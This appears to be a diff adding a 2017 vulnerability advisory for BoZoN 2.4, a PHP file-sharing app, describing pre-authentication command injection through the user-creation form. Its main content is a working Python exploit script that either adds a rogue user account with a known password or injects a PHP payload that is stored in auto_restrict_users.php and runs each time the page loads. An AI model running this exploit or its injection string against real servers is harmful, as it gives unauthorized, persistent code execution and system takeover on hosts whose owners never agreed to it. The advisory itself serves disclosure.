@@ -1,0 +1,111 @@
+[+]##################################################################################################
+[+] Credits / Discovery: John Page
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/BOZON-PRE-AUTH-COMMAND-EXECUTION.txt
+[+] ISR: ApparitionSec       
+[+]##################################################################################################
+ 
+
+
+Vendor:
+============
+bozon.pw/en/
+
+
+
+Product:
+===========
+BoZoN 2.4 
+
+Bozon is a simple file-sharing app. Easy to install, free and open source Just copy BoZoN's files onto your server.
+
+
+Vulnerability Type:
+==========================
+Pre-Auth Command Execution 
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Security Issue:
+================
+
+A Bozon vulnerability allows unauthenticated attackers to add arbitrary users and inject system commands to the "auto_restrict_users.php"
+file of the Bozon web interface.
+
+This issue results in arbitrary code execution on the affected host, attackers system commands will get written and stored to the PHP file
+"auto_restrict_users.php" under the private/ directory of the Bozon application, making them persist. Remote attackers will get the command
+responses from functions like phpinfo() as soon as the HTTP request has completed.
+
+In addition when an admin or user logs in or the webpage gets reloaded the attackers commands are then executed as they are stored.
+If a Command is not injected to the "auto_restrict_users.php" file, unauthenticated attackers can opt to add user accounts at will.
+
+
+
+Exploit/POC:
+=============
+
+import urllib,urllib2,time
+
+#Bozon v2.4 (bozon.pw/en/) Pre-Auth Remote Exploit
+#Discovery / credits: John Page - Hyp3rlinx/Apparition
+#hyp3rlinx.altervista.org
+#Exploit: add user account | run phpinfo() command
+#=========================================================
+
+EXPLOIT=0
+IP=raw_input("[Bozon IP]>")
+EXPLOIT=int(raw_input("[Exploit Selection]> [1] Add User 'Apparition', [2] Execute phpinfo()"))
+
+if EXPLOIT==1:
+    CMD="Apparition"
+else:
+    CMD='"];$PWN=''phpinfo();//''//"'
+
+if EXPLOIT != 0:
+   url = 'http://'+IP+'/BoZoN-master/index.php'
+   data = urllib.urlencode({'creation' : '1', 'login' : CMD, 'pass' : 'abc123', 'confirm' : 'abc123', 'token' : ''})
+   req = urllib2.Request(url, data)
+   
+response = urllib2.urlopen(req)
+if EXPLOIT==1:
+    print 'Apparition user account created! password: abc123'
+else:
+    print "Done!... waiting for phpinfo"
+    time.sleep(0.5)
+    print response.read()
+
+
+
+
+Impact:
+===============
+System Takeover
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+====================================
+Vendor Notification: No Replies
+January 17, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c) HYP3RLINX 
